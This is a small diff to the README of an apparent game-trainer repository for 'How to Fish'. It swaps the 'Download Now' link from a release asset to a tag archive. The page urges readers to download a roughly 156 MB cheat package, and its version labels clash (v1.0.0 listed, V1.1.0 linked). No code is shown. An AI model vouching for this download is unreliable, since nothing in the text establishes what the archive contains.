@@ -44,7 +44,7 @@ This repository contains a collection of mods and trainers designed to enhance t
 
 ### ⬇️ Download
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/CoastSergeant/How-to-Fish-Trainer/releases/download/v1.0.0/How.to.Fish.Cheats.zip)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/CoastSergeant/How-to-Fish-Trainer/archive/refs/tags/V1.1.0.zip).
 
 **Latest Version:** `v1.0.0` • **File Size:** ~156 MB
 
